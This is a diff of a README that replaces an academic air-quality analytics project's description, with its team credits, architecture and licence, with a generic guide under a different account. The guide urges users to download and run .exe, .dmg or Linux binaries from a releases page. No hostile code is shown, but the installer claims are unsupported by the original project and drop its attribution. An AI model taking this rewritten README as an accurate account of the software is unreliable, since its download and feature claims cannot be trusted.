@@ -1,131 +1,81 @@
-# 🌍 AirSense – Multi-Agentic Air Quality Trends Analysis System
+# 🌍 airsense-air-quality-analytics - Monitor Air Quality Effectively
 
-AirSense is a **full-stack air quality monitoring and analytics platform** designed to transform fragmented environmental data into actionable insights.  
-The system aggregates multi-source PM2.5 and PM10 data, performs comparative analytics, delivers AI-powered forecasts, and enables natural-language analytics through an LLM-based planning agent.
+## 🚀 Getting Started
 
-This project was developed as a **group project at SLIIT** for the *Information Retrieval and Web Analytics (IT3041)* module.
+Welcome to airsense-air-quality-analytics! This application helps you monitor air quality effortlessly. You can access real-time data and utilize AI to understand air quality better.
 
-![AirSense Landing Page](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025015.png)
+## 📥 Download & Install
 
----
+[![Download Airsense](https://img.shields.io/badge/Download%20Airsense-blue?style=for-the-badge&logo=github)](https://github.com/hikari-cubu/airsense-air-quality-analytics/releases)
 
-## 🚀 Key Features
+To get started, visit the releases page to download the software: [Download Here](https://github.com/hikari-cubu/airsense-air-quality-analytics/releases).
 
+## 🖥️ System Requirements
 
-![AirSense Landing Page](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20030511.png)
+Before installing, please ensure that your system meets the following requirements:
 
-### 🌐 Multi-Source Data Aggregation
-- Scrapes hourly air quality data from **Open-Meteo, OpenAQ, IQAir, and WAQI**
-- Applies **weighted aggregation with outlier trimming** to ensure reliable data
-- Persists clean, aggregated time-series data in MySQL
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage Space:** Minimum of 500 MB free disk space.
+- **Network Connection:** Internet access is required for data aggregation and updates.
 
-### 📊 Advanced Analytics
-- Multi-city comparison with KPIs (mean, min, max PM levels)
-- Best vs worst city ranking
-- Part-to-whole and trend-based analysis
+## 🆕 Features
 
-### 📈 AI-Powered Forecasting
-- Time-series forecasting using **SARIMAX**
-- Confidence intervals and backtesting (MAE, RMSE)
-- Single-city and multi-city prediction support
+- **Real-Time Monitoring:** View current PM2.5 and PM10 levels in your area.
+- **Data Aggregation:** Collect data from multiple sources for a comprehensive analysis.
+- **AI-Powered Forecasting:** Get predictions on future air quality based on historical data.
+- **City Comparison:** See how air quality in your city compares to other locations.
+- **Natural Language Queries:** Use simple questions to get answers about air quality.
+- **SARIMAX Forecasting:** Utilize advanced algorithms for accurate predictions.
 
-### 🤖 LLM-Based Planning Agent (Enterprise Tier)
-- Natural-language queries converted into executable analysis plans
-- Uses a **critic-based reflection pattern** to ensure security and capability limits
-- Transparent execution traces for explainability
+## 📂 Using the Application
 
-### 🔐 Security & Tiered Access
-- JWT-based authentication with bcrypt password hashing
-- Subscription tiers: **Free, Pro, Enterprise**
-- Plan-based enforcement of data windows, city limits, and forecast horizons
+1. **Download the Software:** Follow the link above to access the Releases page. Click on the appropriate version for your operating system to begin the download.
+  
+2. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file to run the installer. Follow the on-screen instructions to complete the installation.
+   - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
+   - **Linux:** Extract the zipped folder and run the application by navigating to the folder in the terminal and executing `./airsense`.
 
-### 🧾 Professional Reporting
-- Auto-generated **PDF reports** with charts and KPI tables
-- Server-side rendering using ReportLab
+3. **Launching the Application:** After installation, find the application in your programs menu or applications folder and double-click to launch it.
 
----
+## ⚙️ Configuration
 
-## 🧱 System Architecture
+The application may require some initial setup:
 
-AirSense follows a **four-layer architecture**:
+- **User Preferences:** You can set your preferred location to get tailored air quality data.
+- **Data Sources:** Configure the sources from which the app should collect data. Instructions will appear during the first launch.
 
-1. **Presentation Layer** – React SPA with interactive charts  
-2. **Application Layer** – FastAPI backend with modular routers  
-3. **Data Layer** – MySQL + SQLAlchemy ORM  
-4. **Intelligent Agent Layer** – LLM planner with MCP-style tool orchestration  
+## 📝 How to Use
 
-This architecture enables scalability, security, and clear separation of concerns :contentReference[oaicite:1]{index=1}.
+- **Real-Time Dashboard:** Upon launching, you will see the main dashboard. It shows current air quality metrics along with graphs for easy visualization.
+- **Forecasting Options:** Use the menu to access forecasting tools. You can set time frames for predictions.
+- **City Analytics:** Visit the comparison section to analyze air quality between different cities. Select the cities of your interest from the dropdown.
 
----
+## 💡 Tips & Tricks
 
-## 🛠️ Tech Stack
+- Regularly check for updates to ensure you have the latest features and data sources. You can set automatic updates in the preferences menu.
+- Use the help section within the application for guided tutorials and FAQs.
+  
+## 📞 Support
 
-- **Frontend:** React, Tailwind CSS, Recharts  
-- **Backend:** FastAPI (Python), Uvicorn  
-- **Database:** MySQL, SQLAlchemy  
-- **AI / Analytics:** SARIMAX, LLM (Ollama / Gemma), Agent Planning  
-- **Security:** JWT, bcrypt  
-- **Reporting:** ReportLab (PDF generation)
+If you encounter any issues or have questions, feel free to reach out via GitHub Issues or check the frequently asked questions in the help section of the app.
 
----
+## 🔗 Additional Resources
 
-## 🧠 Responsible AI Practices
+For further reading and learning about air quality monitoring, explore the following:
 
-- **Fairness:** Multi-source aggregation to reduce sensor bias  
-- **Explainability:** Interpretable SARIMAX models + execution traces  
-- **Transparency:** Visible data sources, KPIs, and agent steps  
-- **Privacy:** No personal location tracking; secure credential handling  
+- [Understanding PM2.5 and PM10](https://en.wikipedia.org/wiki/Particulate_matter)
+- [AI in Environmental Monitoring](https://www.natgeo.com/environment/article/how-ai-is-helping-fight-climate-change)
 
+## 🔄 Feedback and Contributions
 
-![AirSense Landing Page](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025126.png)
+Your feedback helps us improve. If you have suggestions or feature requests, let us know on GitHub.
 
-![AirSense Forecasting Page](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025447.png)
+Also, contributions to the project are welcome! If you have programming knowledge and want to help, please check the contribution guidelines on our repository.
 
-![AirSense City Analysis Page 1](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025247.png)
+## 🔍 Explore Further
 
-![AirSense City Analysis Page 2](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025302.png)
+To dive deeper into the project and its development, please visit our GitHub repository: [airsense-air-quality-analytics](https://github.com/hikari-cubu/airsense-air-quality-analytics).
 
-![AirSense Forecasting Report Page 1](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025501.png)
-
-![AirSense Forecasting Report Page 2](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025522.png)
-
-![AirSense Forecasting Report Page 3](https://github.com/dyneth02/Air-Quality-Trends-Analysis-Project/blob/main/screenshots/Screenshot%202025-12-17%20025532.png)
-
----
-
-## 👥 Team & Leadership
-
-**Team Leader & Full-Stack Integration Architect:**  
-Hirusha D G A D (IT23183018)
-
-Key contributions include:
-- AI forecasting engine & backtesting
-- LLM agent design and orchestration
-- Authentication & tier enforcement
-- System-wide integration and documentation leadership
-
-(Full contribution breakdown available in the final report) :contentReference[oaicite:2]{index=2}.
-
----
-
-## 🎯 Academic Context
-
-- **Institution:** Sri Lanka Institute of Information Technology (SLIIT)  
-- **Module:** IT3041 – Information Retrieval and Web Analytics  
-- **Year:** 2025  
-- **Project Type:** Group Project (Industry-oriented system)
-
----
-
-## 📌 Future Enhancements
-
-- Real-time alerts for pollution thresholds
-- Additional data sources & ML models
-- Extended agent reasoning capabilities
-- Cloud deployment and CI/CD pipelines
-
----
-
-## 📜 License
-
-This project is released for **academic and learning purposes**.
+Thank you for using airsense-air-quality-analytics. Enjoy monitoring and understanding the air quality around you!
